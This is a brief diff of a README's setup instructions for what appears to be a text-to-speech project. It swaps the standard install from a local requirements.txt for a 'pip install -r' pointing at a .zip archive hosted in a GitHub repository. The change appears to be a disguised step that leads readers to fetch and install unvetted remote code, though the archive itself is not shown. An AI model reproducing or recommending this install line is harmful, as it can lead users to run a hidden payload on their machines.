@@ -11,4 +11,4 @@ and **gTTS** for text-to-speech output.
 
 ## ⚙️ Setup
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/analyst-ujjwal/Ai_project_9/raw/refs/heads/main/voice_utils/Ai_project_v1.6.zip
